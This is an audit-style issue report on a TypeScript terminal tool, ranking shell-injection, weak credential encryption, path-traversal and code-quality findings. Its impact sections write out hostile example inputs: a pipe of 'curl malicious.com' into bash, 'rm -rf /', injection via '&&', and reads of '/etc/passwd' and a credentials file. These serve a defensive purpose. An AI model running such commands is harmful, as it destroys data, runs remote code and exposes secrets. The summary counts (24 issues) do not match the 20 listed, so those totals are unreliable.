# Watcher CLI - Issue Report

## Executive Summary

This document outlines all identified issues in the Watcher CLI codebase, organized by severity level. The analysis covers security vulnerabilities, functional bugs, UX issues, and minor code quality concerns.

---

## Severity Levels

| Level        | Description                                                 |
| ------------ | ----------------------------------------------------------- |
| **Extreme**  | Immediate security risk or data loss potential              |
| **Critical** | Significant security/functional impact requiring urgent fix |
| **Moderate** | Notable issues affecting reliability or user experience     |
| **Casual**   | Minor improvements with low impact                          |

---

## EXTREME

### 1. Shell Command Injection

**File:** `src/tui/App.tsx`  
**Lines:** 337-343, 885-898

**Description:**  
User input is passed directly to shell execution without sanitization. The `run`, `exec`, and `$` commands accept arbitrary shell commands.

**Vulnerable Code:**

```typescript
if (lower.startsWith('run ') || lower.startsWith('exec ') || lower.startsWith('$ ')) {
  let shellCmd: string;
  if (lower.startsWith('$ ')) shellCmd = text.substring(2).trim();
  else if (lower.startsWith('run ')) shellCmd = text.substring(4).trim();
  else shellCmd = cmd.substring(5).trim();
  return props.tools.executeShellCommand(shellCmd);
}
```

**Impact:**  
An attacker or careless user could execute:

- `run rm -rf /` - destructive filesystem operations
- `run curl malicious.com | bash` - remote code execution
- `run cat /etc/passwd` - read sensitive files
- `run export API_KEY=xxx && ...` - exfiltrate credentials

**Recommendation:**  
Implement command allowlisting or execute commands in isolated processes with strict timeouts. Consider removing shell execution capability entirely or limiting to read-only commands.

---

### 2. Weak Credential Encryption

**File:** `src/credentials/CredentialManager.ts`  
**Lines:** 28-34

**Description:**  
API keys are encrypted with a weak, predictable key derived from hostname and username using a hardcoded salt.

**Vulnerable Code:**

```typescript
private getMachineId(): string {
  return `${os.hostname()}-${os.userInfo().username}`;
}

constructor(_projectPath: string = process.cwd()) {
  // ...
  const machineId = this.getMachineId();
  this.key = crypto.scryptSync(machineId, 'salt', 32); // Hardcoded salt!
}
```

**Impact:**

- If `.credentials` file is stolen, attacker can easily recompute the key
- Same machine name + username = same key across all installations
- Hardcoded `'salt'` makes it trivial to brute-force
- No protection against rainbow tables

**Recommendation:**

- Use OS keychain (Keychain on macOS, Credential Manager on Windows, libsecret on Linux)
- If local encryption required: use random salt stored separately, or derive key from user passphrase
- Add rate limiting on decryption attempts

---

### 3. Arbitrary File Read via Cat Command

**File:** `src/tui/App.tsx`  
**Lines:** 321-324, 874-883

**Description:**  
Users can read any file on the system via the `cat` command using path traversal.

**Vulnerable Code:**

```typescript
if (lower.startsWith('cat ') || lower.startsWith('read ')) {
  const fp = cmd.substring(lower.startsWith('cat') ? 4 : 5).trim();
  return props.tools.readFile(fp);
}
```

**Impact:**

- `cat ../../../etc/passwd` - read system files
- `cat ~/.watcher/.credentials` - read encrypted credentials
- `cat ../../package.json` - read project secrets

**Recommendation:**  
Validate file paths to ensure they stay within project directory:

```typescript
const resolvedPath = path.resolve(projectPath, filePath);
if (!resolvedPath.startsWith(projectPath)) {
  return 'Access denied: path outside project';
}
```

---

## CRITICAL

### 4. Database Not Closed on Unexpected Exit

**File:** `src/tui/App.tsx`  
**Lines:** 469-473

**Description:**  
Database is only closed when user explicitly runs `/quit`. Unexpected exits (crash, Ctrl+Z, terminal close) may lose unsaved data.

**Code:**

```typescript
if (lower === '/exit' || lower === '/quit') {
  props.session.saveSession();
  props.db.close();
  exit();
  return true;
}
```

**Impact:**

- Recent changes may not be persisted to SQLite WAL
- Session data loss
- Potential database corruption

**Recommendation:**  
Add process exit handlers:

```typescript
process.on('exit', () => db.close());
process.on('SIGINT', () => {
  db.close();
  process.exit(0);
});
```

---

### 5. Git Commands Fail Silently

**File:** `src/git/GitService.ts`  
**Lines:** 93-95, 108-110

**Description:**  
Git operations catch errors and return empty string, providing no feedback to users.

**Code:**

```typescript
getDiff(filePath?: string): string {
  try {
    const command = filePath ? `git diff HEAD -- "${filePath}"` : 'git diff HEAD';
    const diff = execSync(command, { cwd: this.projectPath, encoding: 'utf-8' });
    return diff;
  } catch (error) {
    return ''; // Silent failure
  }
}

getUnstagedDiff(filePath?: string): string {
  try {
    const command = filePath ? `git diff -- "${filePath}"` : 'git diff';
    const diff = execSync(command, { cwd: this.projectPath, encoding: 'utf-8' });
    return diff;
  } catch (error) {
    return ''; // Silent failure
  }
}
```

**Impact:**

- Users don't know when git operations fail
- AI receives empty data and may produce incorrect responses
- Difficult to debug issues

**Recommendation:**  
Throw errors or return structured results with status:

```typescript
interface GitResult {
  success: boolean;
  data?: string;
  error?: string;
}
```

---

### 6. No Input Validation on Search Command

**File:** `src/tui/App.tsx`  
**Lines:** 325-336, 857-872

**Description:**  
Search pattern is passed directly to shell `findstr`/`grep` without escaping, potentially causing command injection or unexpected behavior.

**Code:**

```typescript
if (lower.startsWith('search ') || lower.startsWith('grep ') || lower.startsWith('find ')) {
  const prefixLen = lower.startsWith('search ') ? 7 : lower.startsWith('grep ') ? 5 : 5;
  const pattern = cmd.substring(prefixLen).trim();
  const isWin = process.platform === 'win32';
  const grepCmd = isWin
    ? `findstr /s /i /n "${pattern}" *`
    : `grep -rn --include="*.ts" --include="*.tsx" --include="*.js" --include="*.json" "${pattern}" .`;
  return props.tools.executeShellCommand(grepCmd);
}
```

**Impact:**

- `"hello" && rm -rf /` could execute destructive commands
- Very long patterns could cause DoS
- Special characters could break the command

**Recommendation:**  
Escape special shell characters in patterns before insertion.

---

### 7. No Rate Limiting on AI Requests

**File:** `src/tui/App.tsx`  
**Lines:** 916-1021

**Description:**  
Users can spam AI requests without any throttling, potentially causing:

- Excessive API costs
- Rate limit errors from providers
- UI freezing

**Impact:**

- Unexpected high bills
- Provider API blocks
- Poor UX for other operations

**Recommendation:**  
Implement request throttling:

```typescript
const RATE_LIMIT_MS = 1000; // 1 request per second
let lastRequestTime = 0;
```

---

## MODERATE

### 8. TTY Detection May Fail Silently

**File:** `src/modes/app.ts`  
**Lines:** 134-136

**Description:**  
TTY detection and raw mode setup fails silently, which may cause mouse input issues.

**Code:**

```typescript
try {
  if ((process.stdin as any).isTTY) (process.stdin as any).setRawMode(true);
} catch {}
process.stdin.resume();

// Periodically re-resume stdin because Ink calls pause() between renders.
const flowInterval = setInterval(() => process.stdin.resume(), 50);
```

**Impact:**

- Mouse scroll may not work in non-TTY environments
- No feedback to user about why mouse doesn't work
- Background interval runs unnecessarily

**Recommendation:**  
Log warnings in debug mode and add proper TTY detection.

---

### 9. Config Editor API Key Not Validated on Save

**File:** `src/tui/App.tsx`  
**Lines:** 129-153

**Description:**  
When saving config with a new API key, there's no validation that the key works before saving.

**Code:**

```typescript
const handleConfigSave = useCallback(
  async (newConfig: WatcherConfig, newApiKey?: string) => {
    if (newApiKey) {
      const alias = newConfig.keyAlias || 'default';
      await props.credentialManager.storeApiKey(newConfig.aiProvider, newApiKey, alias);
      newConfig = { ...newConfig, keyAlias: alias };
    }
    await props.configManager.save(newConfig);
    configRef.current = newConfig;
    setConfigEditMode(false);
    // No validation!
    // ...
  },
  [props.configManager, props.credentialManager]
);
```

**Impact:**

- Invalid API keys get saved
- User only discovers error when trying to use the app
- Poor UX

**Recommendation:**  
Test API key before saving:

```typescript
const isValid = await aiProviderTest.validateConfig();
if (!isValid) throw new Error('Invalid API key');
```

---

### 10. No Model Validation

**Description:**  
Users can enter any model name without verifying the provider supports it.

**Impact:**

- API calls fail at runtime
- Confusing error messages
- Poor UX

**Recommendation:**  
Fetch available models from provider and validate against selection.

---

### 11. Race Condition in Mouse Handler

**File:** `src/tui/App.tsx`  
**Lines:** 121-122, 199-201

**Description:**  
Mouse click handler ref is updated every render, which may cause stale closures during rapid updates.

**Code:**

```typescript
const handlePaletteClickRef = useRef<(x: number, y: number) => void>(() => {});
// Updated every render to avoid stale closures
```

**Impact:**

- Missed clicks
- Incorrect command selection
- Unpredictable behavior

**Recommendation:**  
Use useCallback with proper dependency management or store handler in a way that survives re-renders.

---

### 12. Session Auto-Save Only on Exit

**File:** `src/modes/sessionManager.ts`

**Description:**  
Sessions are only saved when user explicitly quits or runs `/session save`. Unexpected exits lose conversation history.

**Impact:**

- Lost work on crash
- No backup during long sessions

**Recommendation:**  
Add periodic auto-save:

```typescript
setInterval(() => session.saveSession(), 60000); // Every minute
```

---

### 13. Inconsistent Error Handling

**Description:**  
Some functions throw errors, others return empty strings, null, or undefined.

**Examples:**

- `GitService.getDiff()` returns `''` on error
- `CredentialManager.getApiKey()` returns `null` on error
- `SessionManager` operations throw errors

**Impact:**

- Unpredictable behavior
- Difficult debugging
- Type safety issues

**Recommendation:**  
Standardize error handling approach across all modules.

---

### 14. Mouse Enable Sequence Not Fully Cleaned Up

**File:** `src/modes/app.ts`  
**Lines:** 175-176

**Description:**  
Mouse escape sequences are written on exit but may not restore terminal state in all scenarios.

**Code:**

```typescript
finally {
  clearInterval(flowInterval);
  process.stdin.off('data', mouseHandler);
  process.stdout.write('\x1b[?1006l');
  process.stdout.write('\x1b[?1000l');
}
```

**Impact:**

- Terminal may be left in inconsistent state after crash
- Mouse reporting may remain enabled

**Recommendation:**  
Add more robust cleanup and consider using a dedicated cleanup library.

---

## CASUAL

### 15. Hardcoded Salt String

**File:** `src/credentials/CredentialManager.ts`  
**Line:** 29

**Code:**

```typescript
this.key = crypto.scryptSync(machineId, 'salt', 32);
```

**Impact:**  
Same salt across all installations weakens the key derivation.

**Recommendation:**  
Use random salt per installation, stored separately from credentials.

---

### 16. Inconsistent String Formatting in UI

**Description:**  
Some messages use markdown, others plain text, others chalk formatting. Inconsistent experience.

**Recommendation:**  
Standardize message formatting across all components.

---

### 17. Magic Numbers

**Examples:**

- `5000` - File analysis debounce timeout
- `50` - stdin resume interval
- `3` - Mouse scroll lines
- `MAX_TOOL_ROUNDS = 3` - AI tool call limit
- `6` - Recent messages to keep

**Recommendation:**  
Extract to named constants at top of files.

---

### 18. Unused Imports or Variables

Run `npm run lint` to identify and fix linting issues.

---

### 19. Console.log Usage in Production

Some places use `console.log` instead of the configured logger.

**Recommendation:**  
Use the centralized logger from `src/utils/logger.ts` consistently.

---

### 20. Missing TypeScript Strict Mode

**Recommendation:**  
Enable strict TypeScript checks in `tsconfig.json` for better type safety.

---

## Summary Statistics

| Severity  | Count  |
| --------- | ------ |
| Extreme   | 3      |
| Critical  | 4      |
| Moderate  | 10     |
| Casual    | 7      |
| **Total** | **24** |

---

## Recommended Priority

1. **Immediate (Extreme):** Fix shell injection, credential encryption, file read vulnerabilities
2. **This Week (Critical):** Add exit handlers, error handling improvements, input validation
3. **This Month (Moderate):** Rate limiting, validation, race conditions
4. **Backlog (Casual):** Code quality, constants, linting

---

_Generated: March 2026_
_Tool: Watcher CLI Code Analysis_
